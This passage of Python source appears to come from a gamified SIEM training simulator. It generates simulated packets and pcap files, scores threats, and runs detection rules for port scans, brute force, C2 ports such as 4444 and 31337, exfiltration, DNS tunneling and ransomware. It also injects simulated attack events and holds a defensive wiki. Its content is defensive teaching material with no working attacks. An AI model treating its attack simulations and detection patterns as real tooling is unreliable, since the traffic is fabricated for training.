    return {"frame":{"number":random.randint(1,50000),"time":event.get("timestamp",datetime.now().isoformat()),"length":size,"interface":"eth0 (simulated)"},"ethernet":{"src_mac":make_mac(),"dst_mac":make_mac(),"type":"0x0800 (IPv4)"},"ip":{"version":4,"total_length":size,"id":f"0x{ip_id:04X}","flags":"0x4000 (DF)" if os_fp["df"] else "0x0000","ttl":os_fp["ttl"],"protocol":f"{proto_num} ({proto})","checksum":make_checksum(),"src":src_ip,"dst":dst_ip,"os_fingerprint":os_fp["os"]},"transport":{"protocol":proto,"src_port":src_port,"dst_port":dst_port,"seq":seq if proto_num==6 else None,"ack":ack if proto_num==6 else None,"flags":f"0x{flags_val:03X} ({flags_str})","window_size":os_fp["window"],"checksum":make_checksum()},"payload":{"length":max(0,size-54),"raw_preview":raw[:200],"hex_dump":hex_dump_lines(raw),"entropy":round(random.uniform(3.5,7.9),2),"encoding":random.choice(["None","None","None","Base64","XOR-obfuscated"])},"geo":{"src_country":random.choice(["RU","CN","NL","DE","UA","BR","KR","IR","US","US"]),"dst_country":"US","src_asn":f"AS{random.randint(1000,65000)}","src_org":random.choice(["DigitalOcean LLC","OVH SAS","Hetzner Online","Vultr Holdings","Amazon AWS","Tor Exit Node","Unknown ISP"])},"service_banner":{22:"SSH-2.0-OpenSSH_8.9p1",80:"HTTP/1.1 200 OK",443:"TLS 1.3",4444:None,3389:"RDP 10.0"}.get(dst_port),"attack_type":attack_type}

def _ip_bytes(ip):
    try: return bytes(int(x) for x in ip.split("."))
    except: return bytes(4)

def build_pcap(packet_list):
    buf=io.BytesIO(); buf.write(struct.pack("<IHHiIII",0xA1B2C3D4,2,4,0,0,65535,1))
    base=datetime.now()
    for i,pkt in enumerate(packet_list):
        ts=pkt.get("ts",base+timedelta(milliseconds=i*random.randint(2,80)))
        src=_ip_bytes(pkt.get("src_ip","0.0.0.0")); dst=_ip_bytes(pkt.get("dst_ip","0.0.0.0"))
        sp=pkt.get("src_port",54321); dp=pkt.get("dst_port",80)
        proto=pkt.get("protocol","TCP"); payload=pkt.get("payload_raw","HomeSIEM\r\n").encode("latin-1",errors="replace")[:200]
        is_tcp=proto not in ("UDP","DNS"); pn=6 if is_tcp else 17
        sm=bytes([0x52,0x54,0x00]+[random.randint(0,255) for _ in range(3)]); dm=bytes([0x08,0x00,0x27]+[random.randint(0,255) for _ in range(3)])
        eth=dm+sm+b"\x08\x00"
        if is_tcp:
            flags=pkt.get("tcp_flags",0x018); seq=pkt.get("seq",random.randint(1_000_000,3_000_000_000))
            transport=struct.pack("!HHIIBBHHH",sp,dp,seq,seq+1,0x50,flags,65535,0,0)
        else:
            ul=8+len(payload); transport=struct.pack("!HHHH",sp,dp,ul,0)
        it=20+len(transport)+len(payload)
        ip=struct.pack("!BBHHHBBH4s4s",0x45,0,it,random.randint(1,65535),0x4000,pkt.get("ttl",64),pn,0,src,dst)
        raw=eth+ip+transport+payload
        buf.write(struct.pack("<IIII",int(ts.timestamp()),ts.microsecond,len(raw),len(raw))+raw)
    return buf.getvalue()

def event_to_pcap_packet(event,attack_type="normal"):
    raw=random.choice(PAYLOADS.get(attack_type,PAYLOADS["normal"])).format(id=random.randint(1000,9999),host=event.get("dst_ip","0.0.0.0"),size=event.get("bytes",512),sub="aGVsbG8",mac=make_mac())
    return {"src_ip":event.get("src_ip","0.0.0.0"),"dst_ip":event.get("dst_ip","0.0.0.0"),"src_port":event.get("src_port",make_src_port()),"dst_port":event.get("dst_port",80),"protocol":event.get("protocol","TCP"),"payload_raw":raw,"ttl":random.choice([64,64,128,128]),"tcp_flags":TCP_FLAGS_MAP.get(event.get("flags","PSH-ACK"),0x018),"seq":random.randint(1_000_000,3_000_000_000),"ts":datetime.fromisoformat(event["timestamp"]) if event.get("timestamp") else datetime.now()}

# ══════════════════════════════════════════════════════════════════════════════
# THREAT SCORE
# ══════════════════════════════════════════════════════════════════════════════

def calculate_threat_score(alert_data, related_events):
    score=0; factors=[]
    sev_w={"critical":40,"high":28,"medium":16,"low":8}
    sev=alert_data.get("severity","low"); w=sev_w.get(sev,8)
    score+=w; factors.append({"label":f"Base severity: {sev.upper()}","weight":w})
    src=alert_data.get("src_ip","")
    if src in threat_intel["blocked_ips"]: score+=25; factors.append({"label":"Source IP on block list","weight":25})
    dp=alert_data.get("raw_event",{}).get("dst_port",0)
    if dp in {4444,1337,31337,12345,6667,9001}: score+=15; factors.append({"label":f"High-risk port ({dp})","weight":15})
    sc=sum(1 for e in related_events if e.get("src_ip")==src)
    if sc>=10: score+=12; factors.append({"label":f"High event frequency ({sc})","weight":12})
    elif sc>=5: score+=6; factors.append({"label":f"Elevated frequency ({sc})","weight":6})
    if alert_data.get("raw_event",{}).get("bytes",0)>5_000_000: score+=10; factors.append({"label":"Large payload (>5MB)","weight":10})
    if alert_data.get("raw_event",{}).get("type")=="auth_failure": score+=8; factors.append({"label":"Auth failure event","weight":8})
    score=min(score,100)
    level="CRITICAL" if score>=80 else "HIGH" if score>=60 else "MEDIUM" if score>=35 else "LOW"
    return {"score":score,"level":level,"factors":factors}

# ══════════════════════════════════════════════════════════════════════════════
# DETECTION RULES
# ══════════════════════════════════════════════════════════════════════════════

class DetectionRule:
    def __init__(self,rule_id,name,desc,severity,check_fn,mitre=None):
        self.rule_id=rule_id;self.name=name;self.description=desc;self.severity=severity
        self.check_fn=check_fn;self.enabled=True;self.trigger_count=0;self.mitre=mitre or []

port_scan_tracker   = defaultdict(lambda:{"ports":set(),"last_seen":datetime.now()})
brute_force_tracker = defaultdict(lambda:{"attempts":0,"last_seen":datetime.now()})

def check_port_scan(e):
    if e.get("type")!="connection": return None
    src=e.get("src_ip")
    if not src: return None
    t=port_scan_tracker[src];now=datetime.now()
    if (now-t["last_seen"]).seconds>60: t["ports"]=set()
    t["ports"].add(e.get("dst_port",0));t["last_seen"]=now
    if len(t["ports"])>=10:
        n=len(t["ports"]);t["ports"]=set()
        return {"title":"Port Scan Detected","detail":f"Host {src} probed {n} unique ports in <60s. Classic pre-exploitation reconnaissance.","src_ip":src,"attack_type":"port_scan"}
    return None

def check_brute_force(e):
    if e.get("type")!="auth_failure": return None
    src=e.get("src_ip")
    if not src: return None
    t=brute_force_tracker[src];now=datetime.now()
    if (now-t["last_seen"]).seconds>300: t["attempts"]=0
    t["attempts"]+=1;t["last_seen"]=now
    if t["attempts"]>=5:
        n=t["attempts"];t["attempts"]=0
        return {"title":"Brute Force Attack","detail":f"{n} failed auth attempts from {src} on port {e.get('dst_port',22)} in 5 min.","src_ip":src,"attack_type":"brute_force"}
    return None

def check_suspicious_port(e):
    PORTS={4444:"Metasploit listener",1337:"Backdoor",31337:"Back Orifice",12345:"NetBus",6667:"IRC C2",9001:"Tor relay"}
    p=e.get("dst_port",0)
    if p in PORTS:
        return {"title":f"Suspicious Port Traffic: {p}","detail":f"Connection to port {p} ({PORTS[p]}) from {e.get('src_ip','?')}.","src_ip":e.get("src_ip"),"attack_type":"c2_beacon"}
    return None

def check_large_transfer(e):
    if e.get("bytes",0)>10_000_000:
        return {"title":"Possible Data Exfiltration","detail":f"Outbound {e['bytes']/1e6:.1f}MB from {e.get('src_ip','?')} to {e.get('dst_ip','?')}.","src_ip":e.get("src_ip"),"attack_type":"data_exfil"}
    return None

def check_blocked_ip(e):
    src=e.get("src_ip","")
    if src in threat_intel["blocked_ips"]:
        return {"title":"Blocked IP Contact","detail":f"Traffic from known-bad IP {src} on your block list.","src_ip":src,"attack_type":"blocked_ip"}
    return None

def check_dns_tunnel(e):
    if e.get("attack_type_hint")=="dns_tunnel":
        return {"title":"DNS Tunneling Detected","detail":f"High-entropy DNS TXT queries from {e.get('src_ip','?')} — possible data exfiltration via DNS.","src_ip":e.get("src_ip"),"attack_type":"dns_tunnel"}
    return None

def check_arp_spoof(e):
    if e.get("attack_type_hint")=="arp_spoof":
        return {"title":"ARP Spoofing Detected","detail":f"MAC address change detected for {e.get('dst_ip','?')} — possible man-in-the-middle attack.","src_ip":e.get("src_ip"),"attack_type":"arp_spoof"}
    return None

def check_ransomware(e):
    if e.get("attack_type_hint")=="ransomware":
        return {"title":"Ransomware Activity Detected","detail":f"Mass file rename/modification from {e.get('src_ip','?')} — ransomware staging in progress.","src_ip":e.get("src_ip"),"attack_type":"ransomware"}
    return None

def check_lateral_movement(e):
    if e.get("attack_type_hint")=="lateral_movement":
        return {"title":"Lateral Movement Detected","detail":f"Pass-the-hash authentication from {e.get('src_ip','?')} to {e.get('dst_ip','?')}.","src_ip":e.get("src_ip"),"attack_type":"lateral_movement"}
    return None

def check_priv_escalation(e):
    if e.get("attack_type_hint")=="priv_escalation":
        return {"title":"Privilege Escalation Attempt","detail":f"Token impersonation / sudo abuse detected on {e.get('dst_ip','?')}.","src_ip":e.get("src_ip"),"attack_type":"priv_escalation"}
    return None

RULES=[
    DetectionRule("R001","Port Scan","Rapid multi-port probing","high",check_port_scan,mitre=["T1046"]),
    DetectionRule("R002","Brute Force","Repeated auth failures","critical",check_brute_force,mitre=["T1110"]),
    DetectionRule("R003","Suspicious Port","Traffic on malicious ports","high",check_suspicious_port,mitre=["T1571"]),
    DetectionRule("R004","Large Transfer","Abnormal outbound volume","medium",check_large_transfer,mitre=["T1041"]),
    DetectionRule("R005","Blocked IP","Contact from blocked host","critical",check_blocked_ip,mitre=["T1071"]),
    DetectionRule("R006","DNS Tunneling","DNS-based C2/exfil","high",check_dns_tunnel,mitre=["T1071.004"]),
    DetectionRule("R007","ARP Spoofing","MAC flip / MitM attempt","high",check_arp_spoof,mitre=["T1557.002"]),
    DetectionRule("R008","Ransomware","Mass file modification","critical",check_ransomware,mitre=["T1486"]),
    DetectionRule("R009","Lateral Movement","Internal credential reuse","critical",check_lateral_movement,mitre=["T1021"]),
    DetectionRule("R010","Privilege Escalation","PrivEsc attempt","critical",check_priv_escalation,mitre=["T1548"]),
]

MITRE_DB={
    "T1046":{"id":"T1046","name":"Network Service Discovery","tactic":"Reconnaissance"},
    "T1110":{"id":"T1110","name":"Brute Force","tactic":"Credential Access"},
    "T1571":{"id":"T1571","name":"Non-Standard Port","tactic":"Command & Control"},
    "T1041":{"id":"T1041","name":"Exfiltration Over C2 Channel","tactic":"Exfiltration"},
    "T1071":{"id":"T1071","name":"Application Layer Protocol","tactic":"Command & Control"},
    "T1071.004":{"id":"T1071.004","name":"DNS","tactic":"Command & Control"},
    "T1557.002":{"id":"T1557.002","name":"ARP Cache Poisoning","tactic":"Credential Access"},
    "T1486":{"id":"T1486","name":"Data Encrypted for Impact","tactic":"Impact"},
    "T1021":{"id":"T1021","name":"Remote Services","tactic":"Lateral Movement"},
    "T1548":{"id":"T1548","name":"Abuse Elevation Control Mechanism","tactic":"Privilege Escalation"},
}

# ══════════════════════════════════════════════════════════════════════════════
# ALERT CREATION
# ══════════════════════════════════════════════════════════════════════════════

def create_alert(rule, match_data, event, is_fp_trap=False):
    alert_id_counter[0]+=1; rule.trigger_count+=1; aid=alert_id_counter[0]
    attack_type=match_data.get("attack_type","normal"); src=match_data.get("src_ip",event.get("src_ip",""))
    related=[e for e in list(events)[:150] if e.get("src_ip")==src]

    # Build pcap packets
    packets=[]; base=dict(event); base.setdefault("src_port",make_src_port())
    for i in range(random.randint(3,15)):
        ev=dict(base)
        if attack_type=="port_scan": ev["dst_port"]=random.randint(1,65535); ev["flags"]="SYN"; ev["bytes"]=60; ev["src_port"]=base["src_port"]+i
        packets.append(event_to_pcap_packet(ev,attack_type))
    alert_packets[aid]=packets

    # Host tracking
    host_alerts[src].append(aid)
    host_traffic[src]+=1

    # Add logs
    add_logs_for_event(event, attack_type, count=random.randint(2,5))

    diff=difficulty_state["level"]
    show_type=DIFFICULTY_CONFIG[diff]["show_attack_type"] and not is_fp_trap

    alert={
        "id":aid,"rule_id":rule.rule_id,"rule_name":rule.name,
        "title":match_data.get("title",rule.name),"detail":match_data.get("detail",""),
        "severity":rule.severity,"src_ip":src,"timestamp":datetime.now().isoformat(),
        "status":"open","notes":"","raw_event":event,"attack_type":attack_type if show_type else "unknown",
        "_real_attack_type":attack_type,
        "is_false_positive_trap":is_fp_trap,
        "packet_detail":generate_packet_details(event,attack_type),
        "timeline":[{"time":e.get("timestamp",""),"type":e.get("type","conn"),"src_ip":e.get("src_ip",""),"dst_ip":e.get("dst_ip",""),"dst_port":e.get("dst_port",0),"protocol":e.get("protocol",""),"bytes":e.get("bytes",0),"flags":e.get("flags","")} for e in sorted(related[:8],key=lambda x:x.get("timestamp",""))],
        "threat_score":calculate_threat_score({"severity":rule.severity,"src_ip":src,"raw_event":event},related),
        "mitre":[MITRE_DB[m] for m in rule.mitre if m in MITRE_DB],
        "packet_count":len(packets),"verdict":None,"hint_index":0,
        "difficulty":diff,
        "checklist":[
            {"id":1,"label":"Verify source IP is external/unexpected","done":False},
            {"id":2,"label":"Check if destination service should be exposed","done":False},
            {"id":3,"label":"Review timeline for related activity","done":False},
            {"id":4,"label":"Correlate with log entries","done":False},
            {"id":5,"label":"Export PCAP and inspect in Wireshark","done":False},
            {"id":6,"label":"Cross-reference source IP with threat intel","done":False},
            {"id":7,"label":"Document findings and close or escalate","done":False},
        ],
    }
    alerts.appendleft(alert)

    # War room tracking
    if war_room["active"] and not war_room["complete"]:
        war_room["alerts_to_clear"].append(aid)

    return alert

def process_event(event, is_fp_trap=False):
    event["timestamp"]=datetime.now().isoformat(); events.appendleft(event)
    traffic_stats["total_packets"]+=1; traffic_stats["protocols"][event.get("protocol","OTHER")]+=1
    traffic_stats["bytes_in"]+=event.get("bytes",0)
    src=event.get("src_ip","")
    if src: traffic_stats["top_talkers"][src]+=1; host_traffic[src]+=1
    if is_fp_trap:
        class FakeRule:
            rule_id="R000"; name="Suspicious Activity"; description="Possible anomaly — verify before dismissing"; severity="medium"
            enabled=True; trigger_count=0; mitre=[]
        # Varied, realistic FP scenarios that look suspicious but are benign
        fp_scenarios = [
            {"title":"Outbound Connection to Tor Exit Node",
             "detail":"Internal host connected to 185.220.101.45 (known Tor exit node) on port 443. Traffic volume: 1.2KB. Single short-lived connection. Review of endpoint logs shows this matches the IT team's nightly anonymity-checker script. Destination is on the Tor exit node list but connection is outbound, low-volume, and pre-authorised. Verify against your asset inventory before acting."},
            {"title":"Elevated DNS Query Rate",
             "detail":"Workstation Alpha generated 47 DNS queries in 60 seconds — above baseline of 12/min. Query targets: microsoft.com, windowsupdate.com, office.com, *.azure.net. Pattern matches Windows Update check-in behaviour. No high-entropy subdomains observed. Timestamps align with scheduled update window (02:00 UTC). Likely benign — confirm against patch schedule."},
            {"title":"Large Outbound HTTPS Transfer",
             "detail":"Dev Machine sent 8.4MB to 13.107.42.14 (Microsoft Office 365) over HTTPS port 443 in a single session. Transfer occurred during business hours. Destination resolves to sharepoint.com CDN. Volume is consistent with a file upload to SharePoint. No unusual encoding or timing patterns. Cross-reference with user activity logs before escalating."},
            {"title":"SMB Access from Workstation to File Server",
             "detail":"Workstation Beta authenticated to File Server via SMB (port 445) using domain credentials. User: DOMAIN\\jsmith. Access was to \\\\fileserver\\shared\\hr-documents. Login type 3 (network). This IP/user combination has accessed this share 23 times this month — well within normal baseline. Verify it is not a new source IP for this user before dismissing."},
            {"title":"Repeated Auth Failures — Locked Account",
             "detail":"3 failed SSH authentication attempts from 192.168.1.40 (Workstation Beta) to Web Server. Username: deploy. Failures followed immediately by successful key-based authentication. Pattern consistent with an automation script that tries password auth before falling back to key auth. Check if the deploy account lockout threshold is being approached."},
            {"title":"Port 9001 Outbound Connection",
             "detail":"SIEM/Logger host made a brief outbound connection to 51.15.204.15:9001. Port 9001 is associated with Tor relays. However, this IP is a known Tor directory authority used by the tor daemon for consensus fetching. The SIEM host runs a Tor monitoring daemon for threat intel feeds. Verify this is the expected source process before blocking."},
            {"title":"Internal Host Scanning Common Ports",
             "detail":"Print Server probed ports 80, 443, 8080, and 9100 on 10 internal IPs over 2 minutes. This matches the behaviour of a network-aware printer inventory tool that runs every 6 hours. All destination IPs are within the corporate subnet. Source MAC is consistent with the print server's known hardware address. Cross-check against the scheduled task list."},
        ]
        scenario = random.choice(fp_scenarios)
        create_alert(FakeRule(), {**scenario, "src_ip": event.get("src_ip",""), "attack_type":"normal"}, event, is_fp_trap=True)
        return
    for rule in RULES:
        if not rule.enabled: continue
        try:
            match=rule.check_fn(event)
            if match: create_alert(rule,match,event)
        except: pass

# ══════════════════════════════════════════════════════════════════════════════
# TRAFFIC SIMULATION
# ══════════════════════════════════════════════════════════════════════════════

INTERNAL_IPS=list(NETWORK_HOSTS.keys())
EXTERNAL_IPS=["8.8.8.8","142.250.80.46","151.101.1.140","104.16.85.20","185.220.101.45","91.108.4.72","172.217.14.206"]
COMMON_PORTS=[80,443,22,53,8080,3389,445,139,25,587,3306,5432]

def simulate_normal_traffic():
    # Alert pacing per difficulty:
    # easy:   background events every 8-15s  → ~1 real alert per 45s
    # normal: background events every 3-6s   → ~1 real alert per 20s
    # hard:   background events every 0.5-2s → ~1 real alert per 8s
    PACE = {
        "easy":   (8.0,  15.0),
        "normal": (3.0,  6.0),
        "hard":   (0.5,  2.0),
    }
    while True:
        diff = difficulty_state["level"]
        lo, hi = PACE[diff]
        time.sleep(random.uniform(lo, hi))
        fp_rate = DIFFICULTY_CONFIG[diff]["false_positive_rate"]
        if random.random() < fp_rate:
            src = random.choice(INTERNAL_IPS)
            process_event({"type":"connection","src_ip":src,"dst_ip":random.choice(EXTERNAL_IPS),"dst_port":random.choice(COMMON_PORTS),"src_port":make_src_port(),"protocol":random.choice(["TCP","HTTPS"]),"bytes":random.randint(64,1500),"direction":"outbound","flags":"PSH-ACK"}, is_fp_trap=True)
        else:
            process_event({"type":"connection","src_ip":random.choice(INTERNAL_IPS),"dst_ip":random.choice(EXTERNAL_IPS),"dst_port":random.choice(COMMON_PORTS),"src_port":make_src_port(),"protocol":random.choice(["TCP","UDP","DNS","HTTPS","HTTP"]),"bytes":random.randint(64,1500),"direction":"outbound","flags":"PSH-ACK"})

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK INJECTORS
# ══════════════════════════════════════════════════════════════════════════════

def inject_port_scan(src_ip=None):
    src=src_ip or f"10.0.0.{random.randint(2,254)}"; sp=make_src_port()
    for i,port in enumerate(random.sample(range(1,65535),random.randint(15,40))):
        process_event({"type":"connection","src_ip":src,"dst_ip":"192.168.1.1","dst_port":port,"src_port":sp+i,"protocol":"TCP","bytes":60,"direction":"inbound","flags":"SYN"})
        time.sleep(0.02)
    return src

def inject_brute_force(src_ip=None):
    src=src_ip or f"45.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    for _ in range(random.randint(6,12)):
        process_event({"type":"auth_failure","src_ip":src,"dst_ip":"192.168.1.10","dst_port":22,"src_port":make_src_port(),"protocol":"TCP","bytes":256,"direction":"inbound","username":random.choice(["admin","root","user"]),"flags":"PSH-ACK"})
        time.sleep(0.05)
    return src

def inject_c2_beacon(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS); c2=f"185.220.{random.randint(1,255)}.{random.randint(1,255)}"; sp=make_src_port()
    for i in range(3):
        process_event({"type":"connection","src_ip":src,"dst_ip":c2,"dst_port":random.choice([4444,6667,1337]),"src_port":sp+i,"protocol":"TCP","bytes":random.randint(200,600),"direction":"outbound","flags":"PSH-ACK"})
        time.sleep(0.3)
    return c2

def inject_data_exfil(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS); dst=f"91.108.{random.randint(1,255)}.{random.randint(1,255)}"
    process_event({"type":"connection","src_ip":src,"dst_ip":dst,"dst_port":443,"src_port":make_src_port(),"protocol":"HTTPS","bytes":random.randint(15_000_000,50_000_000),"direction":"outbound","flags":"PSH-ACK"})
    return dst

def inject_blocked_ip():
    if not threat_intel["blocked_ips"]: threat_intel["blocked_ips"].add("185.220.101.45")
    blocked=list(threat_intel["blocked_ips"])[0]
    process_event({"type":"connection","src_ip":blocked,"dst_ip":"192.168.1.20","dst_port":80,"src_port":make_src_port(),"protocol":"HTTP","bytes":512,"direction":"inbound","flags":"SYN"})
    return blocked

def inject_dns_tunnel(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS); dst=f"91.108.{random.randint(1,255)}.1"
    for _ in range(random.randint(5,10)):
        process_event({"type":"connection","src_ip":src,"dst_ip":dst,"dst_port":53,"src_port":make_src_port(),"protocol":"DNS","bytes":random.randint(200,510),"direction":"outbound","flags":"PSH-ACK","attack_type_hint":"dns_tunnel"})
        time.sleep(0.1)
    return src

def inject_arp_spoof(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS); victim="192.168.1.20"
    for _ in range(3):
        process_event({"type":"connection","src_ip":src,"dst_ip":victim,"dst_port":0,"src_port":0,"protocol":"ARP","bytes":42,"direction":"inbound","flags":"","attack_type_hint":"arp_spoof"})
        time.sleep(0.1)
    return src

def inject_ransomware(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS); dst="192.168.1.20"
    process_event({"type":"connection","src_ip":src,"dst_ip":dst,"dst_port":445,"src_port":make_src_port(),"protocol":"SMB","bytes":random.randint(500_000,2_000_000),"direction":"outbound","flags":"PSH-ACK","attack_type_hint":"ransomware"})
    return src

def inject_lateral_movement(src_ip=None):
    src=src_ip or random.choice(["192.168.1.30","192.168.1.40"]); dst="192.168.1.20"
    process_event({"type":"auth_failure","src_ip":src,"dst_ip":dst,"dst_port":445,"src_port":make_src_port(),"protocol":"SMB","bytes":256,"direction":"outbound","flags":"PSH-ACK","attack_type_hint":"lateral_movement","username":"DOMAIN\\Administrator"})
    return src

def inject_priv_escalation(src_ip=None):
    src=src_ip or random.choice(INTERNAL_IPS)
    process_event({"type":"connection","src_ip":src,"dst_ip":src,"dst_port":0,"src_port":0,"protocol":"LOCAL","bytes":0,"direction":"local","flags":"","attack_type_hint":"priv_escalation"})
    return src

# ══════════════════════════════════════════════════════════════════════════════
# WAR ROOM ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def run_war_room(scenario):
    war_room.update({"active":True,"scenario":scenario,"start_time":datetime.now(),"duration_sec":scenario["duration"],"alerts_to_clear":[],"cleared":[],"failed":[],"score":0,"complete":False,"result":None})
    def spawn_attacks():
        for atk in scenario["attacks"]:
            time.sleep(random.uniform(3,12))
            if not war_room["active"]: return
            MAP={"port_scan":inject_port_scan,"brute_force":inject_brute_force,"c2_beacon":inject_c2_beacon,"data_exfil":inject_data_exfil,"dns_tunnel":inject_dns_tunnel,"ransomware":inject_ransomware,"lateral_movement":inject_lateral_movement}
            fn=MAP.get(atk)
            if fn: threading.Thread(target=fn,daemon=True).start()

    def timeout_check():
        time.sleep(scenario["duration"])
        if war_room["active"] and not war_room["complete"]:
            cleared=len(war_room["cleared"]); required=scenario["required_clears"]
            success=cleared>=required
            xp_earned=int(scenario["sla_xp"]*(cleared/max(1,required))) if success else int(scenario["sla_xp"]*0.2)
            analyst_session["xp"]+=xp_earned
            analyst_session["war_rooms_completed"]=analyst_session.get("war_rooms_completed",0)+1
            war_room.update({"active":False,"complete":True,"result":{"success":success,"cleared":cleared,"required":required,"xp":xp_earned,"time":scenario["duration"]}})

    threading.Thread(target=spawn_attacks,daemon=True).start()
    threading.Thread(target=timeout_check,daemon=True).start()

# ══════════════════════════════════════════════════════════════════════════════
# WIKI
# ══════════════════════════════════════════════════════════════════════════════

WIKI = {
    "ports": [
        {"port":21,"name":"FTP","risk":"medium","notes":"File Transfer Protocol. Often misconfigured, allows anonymous access, cleartext creds."},
        {"port":22,"name":"SSH","risk":"low","notes":"Secure Shell. Brute force target. Key-based auth preferred over passwords."},
        {"port":23,"name":"Telnet","risk":"critical","notes":"Cleartext protocol. Should never be exposed. Any Telnet traffic is suspicious."},
        {"port":25,"name":"SMTP","risk":"medium","notes":"Email sending. Open relays enable spam/phishing. Check for unusual outbound volume."},
        {"port":53,"name":"DNS","risk":"medium","notes":"Domain Name System. DNS tunneling uses TXT/NULL records for C2 and exfiltration."},
        {"port":80,"name":"HTTP","risk":"low","notes":"Web traffic. Cleartext — credentials and data visible. Watch for unusual URIs."},
        {"port":443,"name":"HTTPS","risk":"low","notes":"Encrypted web. TLS inspection needed to detect malware using HTTPS for C2."},
        {"port":445,"name":"SMB","risk":"high","notes":"Windows file sharing. EternalBlue, pass-the-hash, ransomware propagation vector."},
        {"port":1337,"name":"Backdoor","risk":"critical","notes":"No legitimate service uses this port. Any traffic here is malware or backdoor."},
        {"port":3389,"name":"RDP","risk":"high","notes":"Remote Desktop. Brute force target. BlueKeep vulnerability. Disable if unused."},
        {"port":4444,"name":"Metasploit","risk":"critical","notes":"Default Metasploit listener. Any traffic here = likely active exploitation."},
        {"port":6667,"name":"IRC/C2","risk":"critical","notes":"IRC chat, repurposed as C2 channel by botnets. Block at perimeter."},
        {"port":9001,"name":"Tor","risk":"high","notes":"Tor relay port. May indicate Tor client or hidden service. Anonymisation of traffic."},
        {"port":31337,"name":"Back Orifice","risk":"critical","notes":"Classic RAT port. Named after 'elite' hacker slang. No legitimate use."},
    ],
    "attacks": [
        {"name":"Port Scan","category":"Reconnaissance","mitre":"T1046","severity":"high",
         "description":"Systematic probing of ports to discover open services. Precedes most attacks.",
         "indicators":["10+ unique ports hit in <60s","All SYN, no established connections","Low TTL values"],
         "response":"Block source IP. Log for future correlation. Check if scan succeeded (open ports)."},
        {"name":"Brute Force","category":"Credential Access","mitre":"T1110","severity":"critical",
         "description":"Automated credential guessing using wordlists or rules. Targets SSH, RDP, web logins.",
         "indicators":["5+ auth failures in 5 min","Sequential username attempts","Consistent timing between attempts"],
         "response":"Block source. Enable account lockout. Check for successful login. Enable MFA."},
        {"name":"C2 Beacon","category":"Command & Control","mitre":"T1571","severity":"critical",
         "description":"Malware calling home to attacker infrastructure. Regular periodic connections.",
         "indicators":["Internal host to suspicious external port","Regular beacon timing","Small consistent payloads"],
         "response":"Isolate infected host. Block C2 destination. Forensic image. Malware analysis."},
        {"name":"Data Exfiltration","category":"Exfiltration","mitre":"T1041","severity":"high",
         "description":"Unauthorised transfer of data outside the network. Often HTTPS to evade inspection.",
         "indicators":["Abnormally large single session","Unknown destination","High payload entropy"],
         "response":"Block destination. Capture traffic. Determine data classification. Notify DPO if PII."},
        {"name":"DNS Tunneling","category":"Command & Control","mitre":"T1071.004","severity":"high",
         "description":"Using DNS queries to exfiltrate data or communicate with C2. Bypasses many firewalls.",
         "indicators":["High-entropy subdomain labels","Excessive TXT queries","Unusual query volume to single domain"],
         "response":"Block domain. Analyse DNS logs. Deploy DNS filtering/RPZ. Investigate source host."},
        {"name":"ARP Spoofing","category":"Credential Access","mitre":"T1557.002","severity":"high",
         "description":"Poisoning the ARP cache to intercept LAN traffic. Enables man-in-the-middle attacks.",
         "indicators":["MAC address change for existing IP","Gratuitous ARP replies","Duplicate IP/MAC mappings"],
         "response":"Enable Dynamic ARP Inspection. Isolate attacker. Use static ARP for critical hosts."},
        {"name":"Ransomware","category":"Impact","mitre":"T1486","severity":"critical",
         "description":"Malware that encrypts files and demands payment. Mass file rename = encryption phase.",
         "indicators":["Mass file rename/modification","VSS shadow copy deletion","Encryption extension pattern"],
         "response":"IMMEDIATELY isolate host. Do not pay. Restore from backup. Investigate initial access."},
        {"name":"Lateral Movement","category":"Lateral Movement","mitre":"T1021","severity":"critical",
         "description":"Post-compromise pivot to other hosts using stolen credentials or exploits.",
         "indicators":["Logon Type 3 from workstation to server","Pass-the-hash","First-seen source IP for user"],
         "response":"Map all affected hosts. Reset all credentials. Segment network. Full forensic investigation."},
        {"name":"Privilege Escalation","category":"Privilege Escalation","mitre":"T1548","severity":"critical",
         "description":"Gaining elevated permissions after initial access. Often via sudo abuse or token theft.",
         "indicators":["Sudo failure spike","Token impersonation","SUID binary execution","New root-level accounts"],
         "response":"Revoke elevated access. Audit sudoers. Check for persistence mechanisms. Rotate all credentials."},
    ],
    "concepts": [
        {"name":"Kill Chain","content":"The Lockheed Martin Cyber Kill Chain describes 7 stages of an attack: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. Detecting and stopping at any stage prevents the attacker reaching their goal."},
        {"name":"IOC vs IOA","content":"Indicators of Compromise (IOC) are forensic evidence of past compromise: malware hashes, IPs, domains. Indicators of Attack (IOA) are behavioural signals of an ongoing attack: process injection, port scanning. IOAs are more valuable — they catch attacks before completion."},
        {"name":"MITRE ATT&CK","content":"A globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. Organized into Tactics (why) and Techniques (how). Essential for threat hunting, detection engineering, and incident response."},
        {"name":"Threat Intelligence","content":"Processed information about adversaries that helps defenders make better decisions. Includes IOCs, TTPs, actor profiles, and campaign data. Feeds your block list with known-malicious IPs, domains, and file hashes."},
        {"name":"Defense in Depth","content":"A layered security strategy — no single control is sufficient. Layers include: perimeter firewall, network segmentation, endpoint protection, logging/SIEM, identity/MFA, and security awareness training."},
        {"name":"Log Correlation","content":"Connecting events across different log sources (firewall, auth, endpoint, DNS) to build a complete picture. A single log rarely tells the full story — brute force in auth logs + port scan in firewall logs = coordinated attack."},
        {"name":"False Positive Rate","content":"The percentage of alerts that are not real threats. High FPR causes alert fatigue and missed real threats. Tuning detection rules, setting baselines, and building context reduces FPR. A well-tuned SIEM targets <5% FPR."},
        {"name":"Incident Response Lifecycle","content":"NIST defines 4 phases: Preparation (policies, tools, training) → Detection & Analysis (identify and scope) → Containment, Eradication & Recovery (isolate, remove, restore) → Post-Incident Activity (lessons learned, improve). Every alert you work is practice for this cycle."},
    ],
}

# ══════════════════════════════════════════════════════════════════════════════
# API ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/stats")
def api_stats():
    uptime=str(datetime.now()-siem_start_time).split(".")[0]
